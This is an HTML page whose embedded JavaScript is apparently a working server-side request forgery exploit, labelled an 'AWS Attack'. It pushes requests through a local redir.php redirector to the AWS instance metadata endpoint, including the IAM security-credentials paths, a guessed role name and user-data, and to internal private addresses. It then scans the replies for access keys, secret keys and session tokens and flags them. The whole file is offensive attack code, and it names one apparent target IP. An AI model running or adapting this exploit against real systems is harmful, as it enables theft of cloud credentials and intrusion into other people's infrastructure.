<!DOCTYPE html>
<html>
<head>
    <title>Internal Redirector Direct</title>
</head>
<body>
    <h1>ğŸ¯ Internal Redirector Direct AWS Attack</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Since 127.0.0.1/redir.php works (176KB response), test it directly against AWS
        var directTests = [
            // Test confirmed working internal redirector against AWS metadata
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/',
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            
            // Try AWS metadata v1 (might not need token)
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
            
            // Try older AWS versions
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
            
            // Try specific role names we've seen mentioned
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
            
            // Try user data
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
            
            // Try without version prefix
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/meta-data/',
            'http://127.0.0.1/redir.php?url=http://169.254.169.254/meta-data/iam/security-credentials/',
            
            // Test basic connectivity confirmation
            'http://127.0.0.1/redir.php?url=http://httpbin.org/get',
            'http://127.0.0.1/redir.php?url=http://httpbin.org/ip',
            
            // Test if internal redirector can access itself
            'http://127.0.0.1/redir.php?url=http://127.0.0.1/',
            'http://127.0.0.1/redir.php?url=http://localhost/',
            
            // Try other internal addresses 
            'http://127.0.0.1/redir.php?url=http://172.16.0.1/',
            'http://127.0.0.1/redir.php?url=http://10.0.0.1/',
            'http://127.0.0.1/redir.php?url=http://192.168.1.1/',
        ];
        
        for(var i = 0; i < directTests.length; i++) {
            try {
                results += "<h3>ğŸ” " + (i+1) + ": " + directTests[i].split('url=')[1] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(directTests[i]), false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 5) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>âœ… RESPONSE: " + xhr.responseText.length + " bytes</div>";
                    
                    // Check for AWS credentials
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;font-weight:bold;'>ğŸš¨ğŸš¨ğŸš¨ AWS CREDENTIALS FOUND! ğŸš¨ğŸš¨ğŸš¨</div>";
                    }
                    if(text.includes('asia') && (text.includes('secret') || text.includes('key'))) {
                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>ğŸ”‘ AWS ACCESS KEY DETECTED! ğŸ”‘</div>";
                    }
                    if(text.includes('token') && text.includes('expiration')) {
                        results += "<div style='background:#32cd32;color:white;padding:10px;'>ğŸ¯ AWS SESSION TOKEN FOUND!</div>";
                    }
                    if(text.includes('s3role') || text.includes('ec2role')) {
                        results += "<div style='background:#ffa500;color:white;padding:8px;'>ğŸ­ IAM ROLE NAME FOUND!</div>";
                    }
                    if(text.includes('ami-') || text.includes('vpc-') || text.includes('subnet-')) {
                        results += "<div style='background:#74c0fc;padding:8px;'>â˜ï¸ AWS INSTANCE METADATA!</div>";
                    }
                    if(text.includes('401') || text.includes('unauthorized')) {
                        results += "<div style='background:#ffeaa7;padding:8px;'>âš ï¸ 401 Unauthorized</div>";
                    }
                    if(text.includes('origin') && text.includes('54.209.100.76')) {
                        results += "<div style='background:#98fb98;padding:8px;'>ğŸŒ Confirmed SSRF working!</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:250px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>âŒ No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>âŒ " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
